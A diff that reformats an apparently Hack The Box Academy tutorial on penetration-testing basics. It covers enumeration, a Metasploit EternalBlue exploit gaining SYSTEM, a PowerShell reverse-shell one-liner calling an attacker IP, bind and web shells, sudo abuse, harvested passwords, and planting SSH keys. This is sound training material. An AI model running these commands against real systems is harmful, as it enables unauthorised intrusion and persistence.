+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Domain:     inlanefreight.com
+[+] Threads:    10
+[+] Timeout:    1s
+[+] Wordlist:   /usr/share/SecLists/Discovery/DNS/namelist.txt
+===============================================================
+2020/12/17 23:08:55 Starting gobuster
+===============================================================
+Found: blog.inlanefreight.com
+Found: customer.inlanefreight.com
+Found: my.inlanefreight.com
+Found: ns1.inlanefreight.com
+Found: ns2.inlanefreight.com
+Found: ns3.inlanefreight.com
+===============================================================
+2020/12/17 23:10:34 Finished
+===============================================================
 ```
 
 This scan reveals several interesting subdomains that we could examine further. The [Attacking Web Applications with Ffuf](https://academy.hackthebox.com/module/details/54) module goes into more details about web enumeration and fuzzing.
@@ -677,7 +986,14 @@ In the last section, we discussed banner grabbing for general purposes. Web serv
 Web Enumeration
 
 ```shell
-6165@htb[/htb]$ curl -IL https://www.inlanefreight.com HTTP/1.1 200 OK Date: Fri, 18 Dec 2020 22:24:05 GMT Server: Apache/2.4.29 (Ubuntu) Link: <https://www.inlanefreight.com/index.php/wp-json/>; rel="https://api.w.org/" Link: <https://www.inlanefreight.com/>; rel=shortlink Content-Type: text/html; charset=UTF-8
+6165@htb[/htb]$ curl -IL https://www.inlanefreight.com
+
+HTTP/1.1 200 OK
+Date: Fri, 18 Dec 2020 22:24:05 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Link: <https://www.inlanefreight.com/index.php/wp-json/>; rel="https://api.w.org/"
+Link: <https://www.inlanefreight.com/>; rel=shortlink
+Content-Type: text/html; charset=UTF-8
 ```
 
 Another handy tool is [EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness), which can be used to take screenshots of target web applications, fingerprint them, and identify possible default credentials.
@@ -689,7 +1005,9 @@ We can extract the version of web servers, supporting frameworks, and applicatio
 Web Enumeration
 
 ```shell
-6165@htb[/htb]$ whatweb 10.10.10.121 http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()]
+6165@htb[/htb]$ whatweb 10.10.10.121
+
+http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()]
 ```
 
 `Whatweb` is a handy tool and contains much functionality to automate web application enumeration across a network.
@@ -697,7 +1015,9 @@ Web Enumeration
 Web Enumeration
 
 ```shell
-6165@htb[/htb]$ whatweb --no-errors 10.10.10.0/24 http://10.10.10.11 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.1], IP[10.10.10.11], PoweredBy[Red,nginx], Title[Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux], nginx[1.14.1] http://10.10.10.100 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.100], Title[File Sharing Service] http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()] http://10.10.10.247 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@cross-fit.htb], Frame, HTML5, HTTPServer[OpenBSD httpd], IP[10.10.10.247], JQuery[3.3.1], PHP[7.4.12], Script, Title[Fine Wines], X-Powered-By[PHP/7.4.12], X-UA-Compatible[ie=edge]
+6165@htb[/htb]$ whatweb --no-errors 10.10.10.0/24
+
+http://10.10.10.11 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.1], IP[10.10.10.11], PoweredBy[Red,nginx], Title[Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux], nginx[1.14.1] http://10.10.10.100 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.100], Title[File Sharing Service] http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()] http://10.10.10.247 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@cross-fit.htb], Frame, HTML5, HTTPServer[OpenBSD httpd], IP[10.10.10.247], JQuery[3.3.1], PHP[7.4.12], Script, Title[Fine Wines], X-Powered-By[PHP/7.4.12], X-UA-Compatible[ie=edge]
 ```
 
 #### Certificates
@@ -751,7 +1071,21 @@ Then, we can use `searchsploit` to search for a specific application by its name
 Public Exploits
 
 ```shell
-6165@htb[/htb]$ searchsploit openssh 7.2 ----------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------------------------------------------------------------------------------------- --------------------------------- OpenSSH 2.3 < 7.7 - Username Enumeration | linux/remote/45233.py OpenSSH 2.3 < 7.7 - Username Enumeration (PoC) | linux/remote/45210.py OpenSSH 7.2 - Denial of Service | linux/dos/40888.py OpenSSH 7.2p1 - (Authenticated) xauth Command Injection | multiple/remote/39569.py OpenSSH 7.2p2 - Username Enumeration | linux/remote/40136.py OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation | linux/local/40962.txt OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading | linux/remote/40963.txt OpenSSH < 7.7 - User Enumeration (2) | linux/remote/45939.py OpenSSHd 7.2p2 - Username Enumeration | linux/remote/40113.txt ----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+6165@htb[/htb]$ searchsploit openssh 7.2
+
+----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                               |  Path
+----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                     | linux/remote/45233.py
+OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                               | linux/remote/45210.py
+OpenSSH 7.2 - Denial of Service                                                                                              | linux/dos/40888.py
+OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                      | multiple/remote/39569.py
+OpenSSH 7.2p2 - Username Enumeration                                                                                         | linux/remote/40136.py
+OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                         | linux/local/40962.txt
+OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                     | linux/remote/40963.txt
+OpenSSH < 7.7 - User Enumeration (2)                                                                                         | linux/remote/45939.py
+OpenSSHd 7.2p2 - Username Enumeration                                                                                        | linux/remote/40113.txt
+----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 ```
 
 We can also utilize online exploit databases to search for vulnerabilities, like [Exploit DB](https://www.exploit-db.com/), [Rapid7 DB](https://www.rapid7.com/db/), or [Vulnerability Lab](https://www.vulnerability-lab.com/). The [Intro to Web Applications](https://academy.hackthebox.com/module/details/75) module discusses public vulnerabilities for web applications.
@@ -776,7 +1110,34 @@ Let us take a basic example of searching for an exploit for an application we ar
 Public Exploits
 
 ```shell
-6165@htb[/htb]$ msfconsole .:okOOOkdc' 'cdkOOOko:. .xOOOOOOOOOOOOc cOOOOOOOOOOOOx. :OOOOOOOOOOOOOOOk, ,kOOOOOOOOOOOOOOO: 'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO' oOOOOOOOO. .oOOOOoOOOOl. ,OOOOOOOOo dOOOOOOOO. .cOOOOOc. ,OOOOOOOOx lOOOOOOOO. ;d; ,OOOOOOOOl .OOOOOOOO. .; ; ,OOOOOOOO. cOOOOOOO. .OOc. 'oOO. ,OOOOOOOc oOOOOOO. .OOOO. :OOOO. ,OOOOOOo lOOOOO. .OOOO. :OOOO. ,OOOOOl ;OOOO' .OOOO. :OOOO. ;OOOO; .dOOo .OOOOocccxOOOO. xOOd. ,kOl .OOOOOOOOOOOOO. .dOk, :kk;.OOOOOOOOOOOOO.cOk: ;kOOOOOOOOOOOOOOOk: ,xOOOOOOOOOOOx, .lOOOOOOOl. ,dOd, . =[ metasploit v6.0.16-dev ] + -- --=[ 2074 exploits - 1124 auxiliary - 352 post ] + -- --=[ 592 payloads - 45 encoders - 10 nops ] + -- --=[ 7 evasion ]
+6165@htb[/htb]$ msfconsole
+
+
+      .:okOOOkdc'           'cdkOOOko:.
+    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
+   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
+  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
+  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
+  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
+  lOOOOOOOO.         ;d;         ,OOOOOOOOl
+  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
+   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
+    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
+     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
+      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
+       .dOOo   .OOOOocccxOOOO.   xOOd.
+         ,kOl  .OOOOOOOOOOOOO. .dOk,
+           :kk;.OOOOOOOOOOOOO.cOk:
+             ;kOOOOOOOOOOOOOOOk:
+               ,xOOOOOOOOOOOx,
+                 .lOOOOOOOl.
+                    ,dOd,
+                      .
+
+       =[ metasploit v6.0.16-dev                          ]
++ -- --=[ 2074 exploits - 1124 auxiliary - 352 post       ]
++ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
 ```
 
 Once we have `Metasploit` running, we can search for our target application with the `search exploit` command. For example, we can search for the SMB vulnerability we identified previously:
@@ -784,7 +1145,16 @@ Once we have `Metasploit` running, we can search for our target application with
 Public Exploits
 
 ```shell
-msf6 > search exploit eternalblue Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- <SNIP> EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+ 4 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010
+msf6 > search exploit eternalblue
+
+Matching Modules
+================
+
+   #  Name                                           Disclosure Date  Rank     Check  Description
+   -  ----                                           ---------------  ----     -----  -----------
+<SNIP>
+EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
+   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 
 ```
 
 Tip: Search can apply complex filters such as search cve:2009 type:exploit. See all the filters with help search
@@ -794,7 +1164,9 @@ We found one exploit for this service. We can use it by copying the full name of
 Public Exploits
 
 ```shell
-msf6 > use exploit/windows/smb/ms17_010_psexec [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 > use exploit/windows/smb/ms17_010_psexec
+
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
 ```
 
 Before we can run the exploit, we need to configure its options. To view the options available to configure, we can use the `show options` command:
@@ -802,7 +1174,25 @@ Before we can run the exploit, we need to configure its options. To view the opt
 Public Exploits
 
 ```shell
-Module options (exploit/windows/smb/ms17_010_psexec): Name Current Setting Required Description ---- --------------- -------- ----------- DBGTRACE false yes Show extra debug trace info LEAKATTEMPTS 99 yes How many times to try to leak transaction NAMEDPIPE no A named pipe that can be connected to (leave blank for auto) NAMED_PIPES /usr/share/metasploit-framework/data/wordlists/named_pipes.txt yes List of named pipes to check RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>' RPORT 445 yes The Target port (TCP) SERVICE_DESCRIPTION no Service description to to be used on target for pretty listing SERVICE_DISPLAY_NAME no The service display name SERVICE_NAME no The service name SHARE ADMIN$ yes The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share SMBDomain . no The Windows domain to use for authentication SMBPass no The password for the specified username SMBUser no The username to authenticate as ...SNIP...
+Module options (exploit/windows/smb/ms17_010_psexec):
+
+   Name                  Current Setting                                                 Required  Description
+   ----                  ---------------                                                 --------  -----------
+   DBGTRACE              false                                                           yes       Show extra debug trace info
+   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
+   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
+   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
+   RHOSTS                                                                                yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT                 445                                                             yes       The Target port (TCP)
+   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
+   SERVICE_DISPLAY_NAME                                                                  no        The service display name
+   SERVICE_NAME                                                                          no        The service name
+   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
+   SMBDomain             .                                                               no        The Windows domain to use for authentication
+   SMBPass                                                                               no        The password for the specified username
+   SMBUser                                                                               no        The username to authenticate as
+
+...SNIP...
 ```
 
 Any option with `Required` set to `yes` needs to be set for the exploit to work. In this case, we only have two options to set: `RHOSTS`, which means the IP of our target (this can be one IP, multiple IPs, or a file containing a list of IPs). We can set them with the `set` command:
@@ -810,7 +1200,10 @@ Any option with `Required` set to `yes` needs to be set for the exploit to work.
 Public Exploits
 
 ```shell
-msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40 RHOSTS => 10.10.10.40 msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0 LHOST => tun0
+msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
+RHOSTS => 10.10.10.40
+msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
+LHOST => tun0
 ```
 
 Once we have both options set, we can start the exploitation. However, before we run the script, we can run a check to ensure the server is vulnerable:
@@ -818,7 +1211,12 @@ Once we have both options set, we can start the exploitation. However, before we
 Public Exploits
 
 ```shell
-msf6 exploit(windows/smb/ms17_010_psexec) > check [*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check [+] 10.10.10.40:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [*] 10.10.10.40:445 - Scanned 1 of 1 hosts (100% complete) [+] 10.10.10.40:445 - The target is vulnerable.
+msf6 exploit(windows/smb/ms17_010_psexec) > check
+
+[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
+[+] 10.10.10.40:445 - The target is vulnerable.
 ```
 
 As we can see, the server is indeed vulnerable. Note that not every exploit in the `Metasploit Framework` supports the `check` function. Finally, we can use the `run` or `exploit` command to run the exploit:
@@ -826,7 +1224,28 @@ As we can see, the server is indeed vulnerable. Note that not every exploit in t
 Public Exploits
 
 ```shell
-msf6 exploit(windows/smb/ms17_010_psexec) > exploit [*] Started reverse TCP handler on 10.10.14.2:4444 [*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1 [*] 10.10.10.40:445 - Built a write-what-where primitive... [+] 10.10.10.40:445 - Overwrite complete... SYSTEM session obtained! [*] 10.10.10.40:445 - Selecting PowerShell target [*] 10.10.10.40:445 - Executing the payload... [+] 10.10.10.40:445 - Service start timed out, OK if running a command or non-service executable... [*] Sending stage (175174 bytes) to 10.10.10.40 [*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.40:49159) at 2020-12-27 01:13:28 +0000 meterpreter > getuid Server username: NT AUTHORITY\SYSTEM meterpreter > shell Process 39640 created. Channel 0 created. Windows 7 Professional 7601 Service Pack 1 (C) Copyright 1985-2009 Microsoft Corp. C:\WINDOWS\system32>whoami NT AUTHORITY\SYSTEM
+msf6 exploit(windows/smb/ms17_010_psexec) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.2:4444 
+[*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
+[*] 10.10.10.40:445 - Built a write-what-where primitive...
+[+] 10.10.10.40:445 - Overwrite complete... SYSTEM session obtained!
+[*] 10.10.10.40:445 - Selecting PowerShell target
+[*] 10.10.10.40:445 - Executing the payload...
+[+] 10.10.10.40:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (175174 bytes) to 10.10.10.40
+[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.40:49159) at 2020-12-27 01:13:28 +0000
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > shell
+Process 39640 created.
+Channel 0 created.
+Windows 7 Professional 7601 Service Pack 1
+(C) Copyright 1985-2009 Microsoft Corp.
+
+C:\WINDOWS\system32>whoami
+NT AUTHORITY\SYSTEM
 ```
 
 As we can see, we have been able to gain admin access to the box and used the `shell` command to drop us into an interactive shell. These are basic examples of using `Metasploit` to exploit a vulnerability on a remote server. There are many retired boxes on the Hack The Box platform that are great for practicing Metasploit. Some of these include, but not limited to:
@@ -874,7 +1293,9 @@ The first step is to start a `netcat` listener on a port of our choosing:
 Types of Shells
 
 ```shell
-6165@htb[/htb]$ nc -lvnp 1234 listening on [any] 1234 ...
+6165@htb[/htb]$ nc -lvnp 1234
+
+listening on [any] 1234 ...
 ```
 
 The flags we are using are the following:
@@ -895,7 +1316,14 @@ However, first, we need to find our system's IP to send a reverse connection bac
 Types of Shells
 
 ```shell
-6165@htb[/htb]$ ip a ...SNIP... 3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500 link/none inet 10.10.10.10/23 scope global tun0 ...SNIP...
+6165@htb[/htb]$ ip a
+
+...SNIP...
+
+3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
+    link/none
+    inet 10.10.10.10/23 scope global tun0
+...SNIP...
 ```
 
 In our example, the IP we are interested in is under `tun0`, which is the same HTB network we connected to through our VPN.
@@ -924,6 +1352,7 @@ Code: powershell
 
 ```powershell
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
+
 ```
 
 We can utilize the exploit we have over the remote host to execute one of the above commands, i.e., through a Python exploit or a Metasploit module, to get a reverse connection. Once we do, we should receive a connection in our `netcat` listener:
@@ -931,7 +1360,13 @@ We can utilize the exploit we have over the remote host to execute one of the ab
 Types of Shells
 
 ```shell
-6165@htb[/htb]$ nc -lvnp 1234 listening on [any] 1234 ... connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572 id uid=33(www-data) gid=33(www-data) groups=33(www-data)
+6165@htb[/htb]$ nc -lvnp 1234
+
+listening on [any] 1234 ...
+connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 As we can see, after we received a connection on our `netcat` listener, we were able to type our command and directly get its output back, right in our machine.
@@ -985,7 +1420,10 @@ We can use `netcat` to connect to that port and get a connection to the shell:
 Types of Shells
 
 ```shell
-6165@htb[/htb]$ nc 10.10.10.1 1234 id uid=33(www-data) gid=33(www-data) groups=33(www-data)
+6165@htb[/htb]$ nc 10.10.10.1 1234
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 As we can see, we are directly dropped into a bash session and can interact with the target system directly. Unlike a `Reverse Shell`, if we drop our connection to a bind shell for any reason, we can connect back to it and get another connection immediately. However, if the bind shell command is stopped for any reason, or if the remote host is rebooted, we would still lose our access to the remote host and will have to exploit it again to gain access.
@@ -1009,7 +1447,14 @@ After we run this command, we will hit `ctrl+z` to background our shell and get 
 Types of Shells
 
 ```shell
-www-data@remotehost$ ^Z 6165@htb[/htb]$ stty raw -echo 6165@htb[/htb]$ fg [Enter] [Enter] www-data@remotehost$
+www-data@remotehost$ ^Z
+
+6165@htb[/htb]$ stty raw -echo
+6165@htb[/htb]$ fg
+
+[Enter]
+[Enter]
+www-data@remotehost$
 ```
 
 Once we hit `fg`, it will bring back our `netcat` shell to the foreground. At this point, the terminal will show a blank line. We can hit `enter` again to get back to our shell or input `reset` and hit enter to bring it back. At this point, we would have a fully working TTY shell with command history and everything else.
@@ -1019,13 +1464,17 @@ We may notice that our shell does not cover the entire terminal. To fix this, we
 Types of Shells
 
 ```shell
-6165@htb[/htb]$ echo $TERM xterm-256color
+6165@htb[/htb]$ echo $TERM
+
+xterm-256color
 ```
 
 Types of Shells
 
 ```shell
-6165@htb[/htb]$ stty size 67 318
+6165@htb[/htb]$ stty size
+
+67 318
 ```
 
 The first command showed us the `TERM` variable, and the second shows us the values for `rows` and `columns`, respectively. Now that we have our variables, we can go back to our `netcat` shell and use the following command to correct them:
@@ -1033,7 +1482,9 @@ The first command showed us the `TERM` variable, and the second shows us the val
 Types of Shells
 
 ```shell
-www-data@remotehost$ export TERM=xterm-256color www-data@remotehost$ stty rows 67 columns 318
+www-data@remotehost$ export TERM=xterm-256color
+
+www-data@remotehost$ stty rows 67 columns 318
 ```
 
 Once we do that, we should have a `netcat` shell that uses the terminal's full features, just like an SSH connection.
@@ -1102,7 +1553,9 @@ Another option is to use `cURL`:
 Types of Shells
 
 ```shell
-6165@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id uid=33(www-data) gid=33(www-data) groups=33(www-data)
+6165@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 As we can see, we can keep changing the command to get its output. A great benefit of a web shell is that it would bypass any firewall restriction in place, as it will not open a new connection on a port but run on the web port on `80` or `443`, or whatever port the web application is using. Another great benefit is that if the compromised host is rebooted, the web shell would still be in place, and we can access it and get command execution without exploiting the remote host again.
@@ -1137,7 +1590,23 @@ Let us take an example of running the Linux script from `PEASS` called `LinPEAS`
 Privilege Escalation
 
 ```shell
-6165@htb[/htb]$ ./linpeas.sh ...SNIP... Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist LEYEND: RED/YELLOW: 99% a PE vector RED: You must take a look at it LightCyan: Users with console Blue: Users without console & mounted devs Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) LightMangenta: Your username ====================================( Basic information )===================================== OS: Linux version 3.9.0-73-generic User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data) ...SNIP...
+6165@htb[/htb]$ ./linpeas.sh
+...SNIP...
+
+Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
+ LEYEND:
+  RED/YELLOW: 99% a PE vector
+  RED: You must take a look at it
+  LightCyan: Users with console
+  Blue: Users without console & mounted devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
+  LightMangenta: Your username
+
+
+====================================( Basic information )=====================================
+OS: Linux version 3.9.0-73-generic
+User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+...SNIP...
 ```
 
 As we can see, once the script runs, it starts collecting information and displaying it in an excellent report. Let us discuss some of the vulnerabilities that we should look for in the output from these scripts.
@@ -1173,7 +1642,13 @@ The `sudo` command in Linux allows a user to execute commands as a different use
 Privilege Escalation
 
 ```shell
-6165@htb[/htb]$ sudo -l [sudo] password for user1: ...SNIP... User user1 may run the following commands on ExampleServer: (ALL : ALL) ALL
+6165@htb[/htb]$ sudo -l
+
+[sudo] password for user1:
+...SNIP...
+
+User user1 may run the following commands on ExampleServer:
+    (ALL : ALL) ALL
 ```
 
 The above output says that we can run all commands with `sudo`, which gives us complete access, and we can use the `su` command with `sudo` to switch to the root user:
@@ -1181,7 +1656,11 @@ The above output says that we can run all commands with `sudo`, which gives us c
 Privilege Escalation
 
 ```shell
-6165@htb[/htb]$ sudo su - [sudo] password for user1: whoami root
+6165@htb[/htb]$ sudo su -
+
+[sudo] password for user1:
+whoami
+root
 ```
 
 The above command requires a password to run any commands with `sudo`. There are certain occasions where we may be allowed to execute certain applications, or all applications, without having to provide a password:
@@ -1189,7 +1668,9 @@ The above command requires a password to run any commands with `sudo`. There are
 Privilege Escalation
 
 ```shell
-6165@htb[/htb]$ sudo -l (user : user) NOPASSWD: /bin/echo
+6165@htb[/htb]$ sudo -l
+
+    (user : user) NOPASSWD: /bin/echo
 ```
 
 The `NOPASSWD` entry shows that the `/bin/echo` command can be executed without a password. This would be useful if we gained access to the server through a vulnerability and did not have the user's password. As it says `user`, we can run `sudo` as that user and not as root. To do so, we can specify the user with `-u user`:
@@ -1197,7 +1678,9 @@ The `NOPASSWD` entry shows that the `/bin/echo` command can be executed without 
 Privilege Escalation
 
 ```shell
-6165@htb[/htb]$ sudo -u user /bin/echo Hello World! Hello World!
+6165@htb[/htb]$ sudo -u user /bin/echo Hello World!
+
+    Hello World!
 ```
 
 Once we find a particular application we can run with `sudo`, we can look for ways to exploit it to get a shell as the root user. [GTFOBins](https://gtfobins.github.io/) contains a list of commands and how they can be exploited through `sudo`. We can search for the application we have `sudo` privilege over, and if it exists, it may tell us the exact command we should execute to gain root access using the `sudo` privilege we have.
@@ -1230,7 +1713,11 @@ Next, we can look for files we can read and see if they contain any exposed cred
 Privilege Escalation
 
 ```shell
-...SNIP... [+] Searching passwords in config PHP files [+] Finding passwords inside logs (limit 70) ...SNIP... /var/www/html/config.php: $conn = new mysqli(localhost, 'db_user', 'password123');
+...SNIP...
+[+] Searching passwords in config PHP files
+[+] Finding passwords inside logs (limit 70)
+...SNIP...
+/var/www/html/config.php: $conn = new mysqli(localhost, 'db_user', 'password123');
 ```
 
 As we can see, the database password '`password123`' is exposed, which would allow us to log in to the local `mysql` databases and look for interesting information. We may also check for `Password Reuse`, as the system user may have used their password for the databases, which may allow us to use the same password to switch to that user, as follows:
@@ -1238,7 +1725,12 @@ As we can see, the database password '`password123`' is exposed, which would all
 Privilege Escalation
 
 ```shell
-6165@htb[/htb]$ su - Password: password123 whoami root
+6165@htb[/htb]$ su -
+
+Password: password123
+whoami
+
+root
 ```
 
 We may also use the user credentials to `ssh` into the server as that user.
@@ -1252,7 +1744,11 @@ Finally, let us discuss SSH keys. If we have read access over the `.ssh` directo
 Privilege Escalation
 
 ```shell
-6165@htb[/htb]$ vim id_rsa 6165@htb[/htb]$ chmod 600 id_rsa 6165@htb[/htb]$ ssh user@10.10.10.10 -i id_rsa root@remotehost#
+6165@htb[/htb]$ vim id_rsa
+6165@htb[/htb]$ chmod 600 id_rsa
+6165@htb[/htb]$ ssh user@10.10.10.10 -i id_rsa
+
+root@remotehost#
 ```
 
 Note that we used the command 'chmod 600 id\_rsa' on the key after we created it on our machine to change the file's permissions to be more restrictive. If ssh keys have lax permissions, i.e., maybe read by other people, the ssh server would prevent them from working.
@@ -1262,7 +1758,22 @@ If we find ourselves with write access to a users`/.ssh/` directory, we can plac
 Privilege Escalation
 
 ```shell
-6165@htb[/htb]$ ssh-keygen -f key Generating public/private rsa key pair. Enter passphrase (empty for no passphrase): ******* Enter same passphrase again: ******* Your identification has been saved in key Your public key has been saved in key.pub The key fingerprint is: SHA256:...SNIP... user@parrot The key's randomart image is: +---[RSA 3072]----+ | ..o.++.+ | ...SNIP... | . ..oo+. | +----[SHA256]-----+
+6165@htb[/htb]$ ssh-keygen -f key
+
+Generating public/private rsa key pair.
+Enter passphrase (empty for no passphrase): *******
+Enter same passphrase again: *******
+
+Your identification has been saved in key
+Your public key has been saved in key.pub
+The key fingerprint is:
+SHA256:...SNIP... user@parrot
+The key's randomart image is:
++---[RSA 3072]----+
+|   ..o.++.+      |
+...SNIP...
+|     . ..oo+.    |
++----[SHA256]-----+
 ```
 
 This will give us two files: `key` (which we will use with `ssh -i`) and `key.pub`, which we will copy to the remote machine. Let us copy `key.pub`, then on the remote machine, we will add it into `/root/.ssh/authorized_keys`:
@@ -1299,7 +1810,10 @@ There are many methods to accomplish this. One method is running a [Python HTTP 
 Transferring Files
 
 ```shell
-6165@htb[/htb]$ cd /tmp 6165@htb[/htb]$ python3 -m http.server 8000 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+6165@htb[/htb]$ cd /tmp
+6165@htb[/htb]$ python3 -m http.server 8000
+
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
 Now that we have set up a listening server on our machine, we can download the file on the remote host that we have code execution on:
@@ -1307,7 +1821,14 @@ Now that we have set up a listening server on our machine, we can download the f
 Transferring Files
 
 ```shell
-user@remotehost$ wget http://10.10.14.1:8000/linenum.sh ...SNIP... Saving to: 'linenum.sh' linenum.sh 100%[==============================================>] 144.86K --.-KB/s in 0.02s 2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]
+user@remotehost$ wget http://10.10.14.1:8000/linenum.sh
+
+...SNIP...
+Saving to: 'linenum.sh'
+
+linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s
+
+2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]
